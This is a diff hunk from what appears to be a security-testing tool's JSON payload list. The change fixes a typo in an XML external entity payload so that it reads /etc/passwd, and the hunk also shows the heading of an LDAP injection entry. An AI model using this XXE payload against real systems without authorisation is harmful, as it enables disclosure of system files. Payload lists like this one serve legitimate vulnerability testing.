@@ -18,7 +18,7 @@
       },
       {"title": "XXE read file",
         "id": "xxe-read-file",
-        "payload": "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY read SYSTEM \"file:///etc/passw\">]><root>&read;</root>"
+        "payload": "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY read SYSTEM \"file:///etc/passwd\">]><root>&read;</root>"
       },
       {"title": "LDAP Injection",
         "id": "ldap",
